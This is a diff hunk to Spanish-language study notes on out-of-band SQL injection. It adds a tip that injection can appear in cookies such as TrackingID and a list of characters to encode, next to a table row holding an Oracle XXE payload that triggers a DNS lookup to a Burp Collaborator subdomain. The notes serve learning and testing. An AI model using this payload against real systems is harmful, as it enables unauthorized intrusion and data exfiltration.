@@ -10,6 +10,16 @@ La técnica OOB consiste en aprovechar funciones de la base de datos que realiza
 
 Antes de intentar extraer datos, debemos confirmar si el servidor puede "salir" a internet.
 
+>!TIP Puede aparacer el SQLi en Cookies como en **TrackingID**
+
+**Apliquemos el encoding crítico en los siguientes payloads:**
+
+- El espacio después de `UNION` y `SELECT`.
+    
+- Los caracteres del XML: `<`, `>`, `"`, `!`, `%`.
+    
+- El espacio dentro del `DOCTYPE` y la `ENTITY`.
+
 | **SGBD**       | **Payload de Confirmación (DNS Lookup)**                                                                                                                                               |
 | -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | **Oracle**     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -` |
